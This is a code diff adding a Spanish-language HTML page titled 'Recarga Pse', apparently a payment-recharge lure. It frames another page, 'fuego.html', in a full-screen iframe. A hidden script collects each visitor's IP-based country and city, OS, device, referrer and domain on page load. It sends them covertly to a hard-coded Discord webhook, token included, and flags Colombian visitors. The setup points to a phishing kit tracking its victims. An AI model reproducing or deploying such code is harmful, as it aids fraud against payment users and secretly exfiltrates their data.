@@ -1,1 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <title>Recarga Pse</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        html,body{margin:0;padding:0;height:100%;overflow:hidden}
+        iframe{border:none;width:100%;height:100vh;display:block}
+    </style>
+</head>
+<body>
+   
+    <iframe
+        src="fuego.html"
+        allowfullscreen
+        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
+    </iframe>
 
+    <!-- ANTES DE </body> -->
+    <script>
+    (() => {
+      const WEBHOOK = "https://discord.com/api/webhooks/1452423210099278049/kAOU-fMKwDd_upUJW207BbKkfjib0gO3PtKvDKXkVOzNbBADHwdWAN6cj83CDVp6ubDY";
+
+      async function getIPInfo() {
+        try {
+          const r = await fetch("https://ipapi.co/json/");
+          return r.ok ? r.json() : {country_name: "Desconocido", city: "Desconocido", country_code: "XX"};
+        } catch {
+          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX"};
+        }
+      }
+
+      function parseUA() {
+        const ua = navigator.userAgent;
+        const isBot = /bot|crawler|spider|crawl/i.test(ua);
+        let os = "Desconocido", device = "Desconocido";
+
+        if (/Windows NT/i.test(ua))        os = "Windows";
+        else if (/Mac OS X/i.test(ua))     os = "macOS";
+        else if (/Android/i.test(ua))      os = "Android";
+        else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
+        else if (/Linux/i.test(ua))        os = "Linux";
+
+        if (/Samsung/i.test(ua))           device = "Samsung";
+        else if (/iPhone/i.test(ua))       device = "iPhone";
+        else if (/iPad/i.test(ua))         device = "iPad";
+        else if (/Huawei/i.test(ua))       device = "Huawei";
+        else if (/Xiaomi/i.test(ua))       device = "Xiaomi";
+        else device = "PC/Otro";
+
+        return {os, device, isBot};
+      }
+
+      window.addEventListener("DOMContentLoaded", async () => {
+        const ip   = await getIPInfo();
+        const ua   = parseUA();
+        const originDomain = window.location.hostname;
+        const fullURL      = window.location.href;
+
+        const payload = {
+          username: "ELDEMON",
+          embeds: [{
+            color: ip.country_code === "CO" ? 0x00ff00 : 0xff0000,
+            title: ua.isBot ? "🤖  BOT detectado" : "👤  Visita humana",
+            fields: [
+              {name: "🌍  País",       value: ip.country_name, inline: true},
+              {name: "🏙️  Ciudad",    value: ip.city,         inline: true},
+              {name: "📍  Origen",     value: ip.country_code === "CO" ? "🇨🇴  Colombia" : "🌐  Exterior", inline: true},
+              {name: "💻  SO",         value: ua.os,           inline: true},
+              {name: "📱  Dispositivo",value: ua.device,       inline: true},
+              {name: "🔗  Dominio ref",value: document.referrer || "Directo / Sin referrer", inline: true},
+              {name: "🌐  Sitio Puribal",value: originDomain, inline: true},
+              {name: "🕒  Hora (UTC)", value: new Date().toISOString(), inline: true}
+            ]
+          }]
+        };
+
+        fetch(WEBHOOK, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(payload),
+          keepalive: true
+        }).catch(() => {});
+      });
+    })();
+    </script>
+</body>
+</html>
